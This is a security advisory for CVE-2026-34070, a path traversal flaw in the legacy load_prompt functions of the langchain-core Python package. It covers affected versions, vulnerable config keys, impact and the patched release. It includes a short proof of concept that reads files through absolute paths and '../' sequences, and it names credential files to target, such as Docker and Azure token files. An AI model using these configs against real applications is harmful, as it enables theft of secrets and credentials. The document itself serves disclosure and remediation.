# [H] LangChain Core has Path Traversal vulnerabilites in legacy `load_prompt` functions

## Summary
Severity: High
Advisory: GHSA-qh6h-p6c9-ff54
CVE: CVE-2026-34070
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-qh6h-p6c9-ff54
Type: github-advisory

## Affected
- PyPI: `langchain-core` — affected >=0 <1.2.22

## Details
## Summary

Multiple functions in `langchain_core.prompts.loading` read files from paths embedded in deserialized config dicts without validating against directory traversal or absolute path injection. When an application passes user-influenced prompt configurations to `load_prompt()` or `load_prompt_from_config()`, an attacker can read arbitrary files on the host filesystem, constrained only by file-extension checks (`.txt` for templates, `.json`/`.yaml` for examples).

**Note:** The affected functions (`load_prompt`, `load_prompt_from_config`, and the `.save()` method on prompt classes) are undocumented legacy APIs. They are superseded by the `dumpd`/`dumps`/`load`/`loads` serialization APIs in `langchain_core.load`, which do not perform filesystem reads and use an allowlist-based security model. As part of this fix, the legacy APIs have been formally deprecated and will be removed in 2.0.0.

## Affected component

**Package:** `langchain-core`
**File:** `langchain_core/prompts/loading.py`
**Affected functions:** `_load_template()`, `_load_examples()`, `_load_few_shot_prompt()`

## Severity

**High** 

The score reflects the file-extension constraints that limit which files can be read.

## Vulnerable code paths

| Config key | Loaded by | Readable extensions |
|---|---|---|
| `template_path`, `suffix_path`, `prefix_path` | `_load_template()` | `.txt` |
| `examples` (when string) | `_load_examples()` | `.json`, `.yaml`, `.yml` |
| `example_prompt_path` | `_load_few_shot_prompt()` | `.json`, `.yaml`, `.yml` |

None of these code paths validated the supplied path against absolute path injection or `..` traversal sequences before reading from disk.

## Impact

An attacker who controls or influences the prompt configuration dict can read files outside the intended directory:

- **`.txt` files:** cloud-mounted secrets (`/mnt/secrets/api_key.txt`), `requirements.txt`, internal system prompts
- **`.json`/`.yaml` files:** cloud credentials (`~/.docker/config.json`, `~/.azure/accessTokens.json`), Kubernetes manifests, CI/CD configs, application settings

This is exploitable in applications that accept prompt configs from untrusted sources, including low-code AI builders and API wrappers that expose `load_prompt_from_config()`.

## Proof of concept

```python
from langchain_core.prompts.loading import load_prompt_from_config

# Reads /tmp/secret.txt via absolute path injection
config = {
    "_type": "prompt",
    "template_path": "/tmp/secret.txt",
    "input_variables": [],
}
prompt = load_prompt_from_config(config)
print(prompt.template)  # file contents disclosed

# Reads ../../etc/secret.txt via directory traversal
config = {
    "_type": "prompt",
    "template_path": "../../etc/secret.txt",
    "input_variables": [],
}
prompt = load_prompt_from_config(config)

# Reads arbitrary .json via few-shot examples
config = {
    "_type": "few_shot",
    "examples": "../../../../.docker/config.json",
    "example_prompt": {
        "_type": "prompt",
        "input_variables": ["input", "output"],
        "template": "{input}: {output}",
    },
    "prefix": "",
    "suffix": "{query}",
    "input_variables": ["query"],
}
prompt = load_prompt_from_config(config)
```

## Mitigation

**Update `langchain-core` to >= 1.2.22.**

The fix adds path validation that rejects absolute paths and `..` traversal sequences by default. An `allow_dangerous_paths=True` keyword argument is available on `load_prompt()` and `load_prompt_from_config()` for trusted inputs.

As described above, these legacy APIs have been formally deprecated. Users should migrate to `dumpd`/`dumps`/`load`/`loads` from `langchain_core.load`.

## Credit

- [jiayuqi7813](https://github.com/jiayuqi7813) reporter
- [VladimirEliTokarev](https://github.com/VladimirEliTokarev) reporter
- [Rickidevs](https://github.com/Rickidevs) reporter
- Kenneth Cox (cczine@gmail.com) reporter

## References
- https://github.com/langchain-ai/langchain/security/advisories/GHSA-qh6h-p6c9-ff54
- https://nvd.nist.gov/vuln/detail/CVE-2026-34070
- https://github.com/langchain-ai/langchain/commit/27add913474e01e33bededf4096151130ba0d47c
- https://github.com/langchain-ai/langchain
- https://github.com/langchain-ai/langchain/releases/tag/langchain-core==1.2.22
